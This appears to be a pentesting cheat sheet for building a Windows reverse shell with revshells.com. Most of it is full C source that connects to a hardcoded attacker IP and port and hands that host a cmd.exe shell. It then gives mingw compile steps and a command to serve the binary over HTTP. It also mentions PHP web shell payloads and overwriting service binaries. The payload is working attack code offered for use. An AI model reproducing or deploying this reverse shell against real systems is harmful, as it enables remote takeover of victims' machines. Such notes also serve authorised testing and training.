# Creating a Windows Payload with RevShells.com

## Determine your IP
```bash
ifconfig
```

## https://www.revshells.com/

```bash
# Set your LHOST (Listener Port)
# Pick out OS
# Pick out Payload Type. Popular ones:
    - Powershell #3 (Base64)
    - Powershell #3
    - C Windows # Great for overwriting binaries (Services)

# Popular Web Based Payloads
    - PHP Ivan Sincek
    - PHP Pentest Monkey
```

## Copy your code

```bash
# Example C Windows:

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.45.244"; 
char port[6] = "9099";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
------------------------------

## Compile it
```bash
#Create File
sudo nano nano shell.c
#Paste and Save

# Compile it
x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
````

## Serve File
```bash
# Python
python3 -m http.server 80

# SMB
<PASTE COMMAND HERE>
```